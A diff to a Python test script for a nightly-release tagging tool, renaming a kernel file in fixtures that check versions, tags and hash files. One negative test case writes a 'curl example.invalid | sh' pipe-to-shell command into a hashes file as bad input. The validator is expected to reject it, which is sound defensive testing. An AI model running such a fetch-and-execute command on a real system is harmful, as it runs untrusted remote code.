@@ -66,7 +66,7 @@ def nightly(base, tag, files, annotated=True):
 
 
 g('init', '-q', '-b', 'testing')
-put(NP.INIT, init('0.2.1')); put(NP.HASHES, f'{H}  k3.hsaco\n'); put('README.md', 'x\n')
+put(NP.INIT, init('0.2.1')); put(NP.HASHES, f'{H}  dec_core.hsaco\n'); put('README.md', 'x\n')
 c1 = commit('release 0.2.1'); g('tag', '-a', '-m', 'v0.2.1', 'v0.2.1')
 put('README.md', 'y\n'); c2 = commit('a change')
 
@@ -87,7 +87,7 @@ check(PV.Version('0.2.1') < PV.Version('0.2.2.dev20261112') < PV.Version('0.2.2.
 
 # ---- which commit has its nightly
 check(NP.built(R, c2) is None and NP.main(['--repo', R, 'built', '--base', c2]) == 3, 'a commit without a nightly')
-good = {NP.INIT: init('0.2.2.dev20261112'), NP.HASHES: f'{H}  k3.hsaco\n{"cd" * 32}  k3_new.hsaco\n'}
+good = {NP.INIT: init('0.2.2.dev20261112'), NP.HASHES: f'{H}  dec_core.hsaco\n{"cd" * 32}  k3_new.hsaco\n'}
 nightly(c2, 'v0.2.2.dev20261112', good)
 check(NP.built(R, c2) == 'v0.2.2.dev20261112' and NP.built(R, c1) is None, 'the nightly tag of a commit is found by its parent; the release tag is not one')
 
@@ -107,7 +107,7 @@ bad = [('v0.2.2.dev20261114', {**good, NP.INIT: init('0.2.2.dev20261114'), 'READ
        ('v0.2.2.dev20261116', {NP.INIT: init('0.2.2.dev20261199')}, 'more than its __version__ line', 'a version that is not the tag\'s'),
        ('v0.2.3.dev20261117', {NP.INIT: init('0.2.3.dev20261117')}, 'not a dev version of the parent', 'a version two patches ahead'),
        ('v0.2.2.dev20261118', {NP.INIT: init('0.2.2.dev20261118'), NP.HASHES: 'curl example.invalid | sh\n'}, 'not "<sha256>', 'a hashes line that is not a hash'),
-       ('v0.2.2.dev20261119', {NP.HASHES: f'{"ef" * 32}  k3.hsaco\n'}, 'does not change', 'no version change')]
+       ('v0.2.2.dev20261119', {NP.HASHES: f'{"ef" * 32}  dec_core.hsaco\n'}, 'does not change', 'no version change')]
 for tag, files, word, what in bad:
     nightly(c2, tag, files, annotated=False)
     fails = NP.check_tag(R, tag, base=c2)
